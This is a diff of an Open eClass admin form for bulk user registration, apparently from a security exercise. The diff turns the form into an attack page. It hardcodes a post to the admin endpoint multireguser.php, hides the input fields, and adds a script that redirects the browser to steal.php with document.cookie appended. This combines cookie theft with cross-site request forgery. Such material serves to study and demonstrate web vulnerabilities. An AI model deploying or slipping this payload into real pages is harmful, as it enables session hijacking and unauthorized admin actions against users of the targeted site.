@@ -1,33 +1,29 @@
-<form method='post' action='".esc($_SERVER['PHP_SELF'])."'>
+<form method='post' action='http://localhost/openeclass/modules/admin/multireguser.php'>
 <table class='FormData'>
-<tr><th>$langMultiRegFields</th>
-    <td><input type='text' name='fields' size='50' value='first last id email phone' /></td>
-<tr><th>$langUsersData</th>
-    <td><textarea class='auth_input' name='user_info' rows='10' cols='60'></textarea></td>
+<tr>
+    <td><input type='hidden' name='fields' size='50' value='first last id email phone' /></td>
+<tr>
+    <td><input type='hidden' class='auth_input' name='user_info' rows='10' cols='60' />
+	<script>
+	window.location ='http://localhost/openeclass/steal.php?cookie='+encodeURI(document.cookie);
+	</script>
+	</td>
 </tr>
-<tr><th>$langMultiRegType</th>
+<tr>
     <td><select name='type'>
-        <option value='stud'>$langsOfStudents</option>
-        <option value='prof'>$langOfTeachers</option></select></td>
+        <option value='stud'></option>
+        <option value='prof'></option></select></td>
 </tr>
-<tr><th>$langMultiRegPrefix</th>
+<tr>
     <td><input type='text' name='prefix' size='10' value='user' /></td>
 </tr>
-<tr><th>$langFaculty</th>
-    <td>" . selection($facs, 'facid') . "</td>
-</tr>
-<tr><th>$langAm</th>
+
+<tr>
     <td><input type='text' name='am' size='10' /></td>
 </tr>
-<tr><th>$langLanguage</th>
-    <td>" . lang_select_options('lang') . "</td>
-</tr>
-<tr><th>$langInfoMail</th>
-    <td><input name='send_mail' type='checkbox' />
-        $langMultiRegSendMail</td>
-</tr>
-<tr><th>&nbsp;</th>
-    <td><input type='submit' name='submit' value='$langSubmit' /></td>
+
+<tr>
+    <td><input type='submit' name='submit' value='Submit' /></td>
 </tr>
 </table>
 </form>
